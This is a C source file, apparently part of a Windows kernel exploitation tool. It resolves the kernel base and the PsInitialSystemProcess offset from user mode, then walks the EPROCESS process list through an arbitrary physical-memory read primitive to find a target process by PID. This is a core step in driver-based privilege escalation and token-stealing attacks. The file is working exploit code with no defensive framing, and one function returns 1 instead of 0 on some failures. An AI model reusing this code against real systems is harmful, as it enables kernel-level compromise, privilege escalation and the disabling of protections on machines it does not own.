#include "EProcess.h"

ULONGLONG ResolvePsInitialSystemProcessOffset() {
    HMODULE hKernel = LoadLibraryW(L"ntoskrnl.exe");
    if (!hKernel)
        return 0;

    ULONGLONG PsInitialSystemProcessOffset = (ULONGLONG)GetProcAddress(hKernel, "PsInitialSystemProcess");
    if (!PsInitialSystemProcessOffset)
        return 0;

    return (PsInitialSystemProcessOffset - (ULONGLONG)hKernel);
}

ULONGLONG ResolveKernelBaseAddress() {
    ULONGLONG driverBasesAddresses[1024];
    DWORD bytesNeeded;

    if (EnumDeviceDrivers((LPVOID*)driverBasesAddresses, sizeof(driverBasesAddresses), &bytesNeeded) == FALSE)
        return 0;

    return (ULONGLONG)driverBasesAddresses[0];
}

ULONGLONG ResolveSystemProcessBase() {
    ULONGLONG PsInitialSystemProcessOffset = ResolvePsInitialSystemProcessOffset();
    if (!PsInitialSystemProcessOffset)
        return 1;

    ULONGLONG KernelBase = ResolveKernelBaseAddress();
    if (!KernelBase)
        return 1;

    ULONGLONG BaseAddress = 0;
    if (!ReadPhysicalMemoryQword(vtop(KernelBase + PsInitialSystemProcessOffset), &BaseAddress))
        return 0;

    return BaseAddress;
}

ULONGLONG GetEprocessFromPid(DWORD pid) {
    ULONGLONG systemEprocess = ResolveSystemProcessBase();
    if (!systemEprocess)
        return 0;

    ULONGLONG listHead = systemEprocess + EP_ACTIVELINKS_OFFSET, listEntry = 0, current = systemEprocess;
    if (!ReadPhysicalMemoryQword(vtop(listHead), &listEntry))
        return 0;

    do {
        ULONGLONG uniqueProcessId = 0;
        if (!ReadPhysicalMemoryQword(vtop(current + EP_UNIQUEPID_OFFSET), &uniqueProcessId))
            return 0;

        if ((DWORD)uniqueProcessId == pid)
            return current;

        ULONGLONG NextListEntry = 0;
        if (!ReadPhysicalMemoryQword(vtop(current + EP_ACTIVELINKS_OFFSET), &NextListEntry))
            return 0;

        current = NextListEntry - EP_ACTIVELINKS_OFFSET;
    } while (current != systemEprocess);
    return 0;
}